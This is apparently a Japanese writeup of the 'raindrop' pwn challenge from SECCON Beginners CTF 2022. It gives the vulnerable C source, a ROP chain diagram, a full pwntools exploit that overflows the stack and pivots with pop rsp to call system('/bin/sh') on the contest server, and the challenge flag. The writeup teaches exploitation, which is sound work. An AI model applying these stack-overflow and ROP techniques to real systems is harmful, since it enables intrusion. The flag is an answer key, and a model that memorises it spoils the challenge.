# SECCON Beginners CTF 2022 `raindrop [pwn]` writeup

## 問題
おぼえていますか?

`nc raindrop.quals.beginners.seccon.jp 9001`

実行ファイルとソースコード、あとwelcom.txtなるものが配られる。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 0x10

void help() {
    system("cat welcome.txt");
}

void show_stack(void *);
void vuln();

int main() {
    vuln();
}

void vuln() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?") ;
    read(0, buf, 0x30);
    puts("bye!");
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts("stack dump...");
    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
    puts("========+===================");
    for (int i = 0; i < 5; i++) {
        unsigned long *p = &((unsigned long*)ptr)[i];
        printf(" %06d | 0x%016lx ", i, *p);
        if (p == ptr)
            printf(" <- buf");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(" <- saved rbp");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(" <- saved ret addr");
        puts("");
    }
    puts("finish");
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    help();
    alarm(60);
}
```

## 解法
プログラムを実行してみるとまずhelp関数が呼ばれてwelcom.txtが出力される。

```
Hey! You are now going to try a simple problem using stack buffer overflow and ROP.

I will list some keywords that will give you hints, so please look them up if you don't understand them.

- stack buffer overflow
- return oriented programming
- calling conventions
```

さすがビギナー向けCTFです。
難易度easyということもあってちゃんと指針を示してくれている！
脆弱性は教えてくれているけど一応セキュリティ機構も確認。

```
[*] '/home/caffeine/ctf/seccon4b22/pwn/raindrop/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
No canaryかつNo PIEなので、welcom.txt通りStack buffer overflowからROPを狙う。
具体的には下の図のようなイメージでROPを積む。

```
 Offset |      Value
========+=================
 + 0x00 |    '/bin/sh'     <- buffer
--------+-----------------
 + 0x08 | 'A'*8 (padding)
--------+-----------------
 + 0x10 | 'A'*8 (padding)  <- saved rbp
--------+-----------------
 + 0x18 | [pop rdi ; ret]  <- saved ret addr
--------+-----------------
 + 0x20 |   ['/bin/sh']
--------+-----------------
 + 0x28 |   [system()]
--------+-----------------
```

"/bin/sh"を第一引数にとってsystem関数を呼ぶ。
これで良いでしょう。
スタック領域のアドレスがランダム化されていますが (ASLR)、最初にスタックの中身を見せてくれるのでmain関数内のrbpが分かります。
このアドレス値から'/bin/sh'のアドレスを逆算しましょう。
動的解析より、格納されたmain関数内のrbpとbufferの先頭アドレスのオフセットが0x20であることが分かるはずです。
(余談ですが、筆者はベースポインタがリークされているのに気付かず任意アドレス書き込みをいかに作るか無駄に悩んで時間を溶かしました…)

… 残念ながらこの方法ではsystem関数でrspのアライメントを確認されて無事セグフォで落ちます。
スタックポインタは0x10の整数倍で調整されていなければなりません。
最も簡単な対応策はROPに[ret]を1つ追加することでrspを0x08ずらす方法ですが、生憎これ以上は書き込めない。
限られた書き込みで如何にアライメントを突破するかがこの問題の争点だと感じました。

## Exploit
read関数を呼ぶことでスタックへの書き込みを増やすのが良いと思いますが、今回は別の手法で。
先程の図ではパディングしただけだったバッファ内の0x10バイトを利用して一撃で仕留めます。

```
 Offset |      Value
========+======================
 + 0x00 |   [pop rdi ; ret]      <- buffer
--------+----------------------
 + 0x08 |     ['/bin/sh']
--------+----------------------
 + 0x10 |      [system()]        <- saved rbp
--------+----------------------
        | [pop rsp ; pop r13 ;
 + 0x18 |  pop r14 ; pop r15 ;
        |  ret                ]  <- saved ret addr
--------+----------------------
 + 0x20 |   [buffer] - 0x18
--------+----------------------
 + 0x28 |      '/bin/sh'
--------+----------------------
```

eipを奪った後、上図がどういう挙動をするかというと
   1. pop rspでスタックポインタがbufferのアドレス - 0x18バイトのところを指す
   2. pop レジスタを3回繰り返してスタックポインタがbufferの先頭アドレスを指したところでret
   3. pop rdiで'/bin/sh'のアドレスを第一引数に設定して
   4. system関数を呼ぶ。アライメントも揃っている

これで完成。bufferへの書き込み0x18バイトとオーバーフロー0x18バイトの計0x30バイトを余すことなく使った美しいエクスプロイト！
以上を踏まえて作成したexploit codeは以下の通り。

```py
from pwn import *
import sys

addr_system = 0x4010a0
addr_pop_rdi = 0x401453
addr_pop_rsp_r13_r14_r15 = 0x40144d

binsh = b"/bin/sh\0x00"

# io = process("./chall")
io = remote("raindrop.quals.beginners.seccon.jp", 9001)

ret = io.readuntil("000002 | ")
print(ret.decode(), end="")

ret = io.readuntil(" ")
print(ret.decode(), end="")

addr_saved_rbp = int(ret.decode(), 16)
addr_buffer = addr_saved_rbp - 0x20
addr_binsh = addr_buffer + 0x28

ret = io.readuntil("understand?")
print(ret.decode())

s = p64(addr_pop_rdi)
s += p64(addr_binsh)
s += p64(addr_system)
s += p64(addr_pop_rsp_r13_r14_r15)
s += p64(addr_buffer - 0x18)
s += binsh
io.send(s)

ret = io.readuntil("finish")
print(ret.decode())

io.interactive()
```

FLAG: `ctf4b{th053_d4y5_4r3_g0n3_f0r3v3r}`

## 追記
スタックのアライメント揃える方法について、ややこしいROP組んで突破したけど関数の頭 (該当関数のpltの先頭)ではなくrbp積んだ後とか関数をcallしてるところに飛ばして調整するのがセオリーらしい。
基本的には、リターンアドレスが入ってるところを関数の頭に書き換えるとリターンアドレスを積む1手順分ずれて上手くいかないってことも学んだ。